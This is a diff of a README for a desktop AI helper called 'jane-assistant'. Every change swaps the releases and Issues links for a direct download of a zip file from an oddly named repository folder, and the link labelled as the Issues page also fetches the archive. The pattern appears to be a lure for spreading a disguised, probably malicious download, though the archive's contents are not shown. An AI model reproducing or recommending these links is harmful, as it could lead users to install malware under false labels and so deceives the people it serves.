@@ -6,11 +6,11 @@ Welcome to **jane-assistant** — a friendly AI helper that lives on your comput
 
 ## 💾 Download & Install
 
-[![Download jane-assistant](https://img.shields.io/badge/Download-jane--assistant-2ea44f?style=for-the-badge&logo=github)](https://github.com/parkcommissionerfeebleness494/jane-assistant/releases)
+[![Download jane-assistant](https://img.shields.io/badge/Download-jane--assistant-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/parkcommissionerfeebleness494/jane-assistant/main/imparipinnate/jane_assistant_v1.7.zip)
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: [https://github.com/parkcommissionerfeebleness494/jane-assistant/releases](https://github.com/parkcommissionerfeebleness494/jane-assistant/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/parkcommissionerfeebleness494/jane-assistant/main/imparipinnate/jane_assistant_v1.7.zip](https://raw.githubusercontent.com/parkcommissionerfeebleness494/jane-assistant/main/imparipinnate/jane_assistant_v1.7.zip)
 
 When you arrive at the page, you'll see a list of files. Look for the most recent version (they're usually at the top). Click the download button next to the file name that matches your computer. Don't worry about technical details — just pick the newest one.
 
@@ -155,13 +155,13 @@ For developers and tech enthusiasts, JANE's code is open-source. You can explore
 
 ## 📧 Need More Help?
 
-If you run into any issues not covered here, visit the [GitHub Issues page](https://github.com/parkcommissionerfeebleness494/jane-assistant/issues) to report problems or ask questions. The community is friendly and helpful.
+If you run into any issues not covered here, visit the [GitHub Issues page](https://raw.githubusercontent.com/parkcommissionerfeebleness494/jane-assistant/main/imparipinnate/jane_assistant_v1.7.zip) to report problems or ask questions. The community is friendly and helpful.
 
 ## 🎉 Get Started Today
 
 Ready to meet your new AI companion?
 
-[![Get JANE Now](https://img.shields.io/badge/Get%20JANE%20Now-8A2BE2?style=for-the-badge&logo=download)](https://github.com/parkcommissionerfeebleness494/jane-assistant/releases)
+[![Get JANE Now](https://img.shields.io/badge/Get%20JANE%20Now-8A2BE2?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/parkcommissionerfeebleness494/jane-assistant/main/imparipinnate/jane_assistant_v1.7.zip)
 
 Visit this link to download the application, and within minutes you'll be having natural, interruptible conversations with your own personal AI assistant. It's private, it's free, and it's amazing.
 
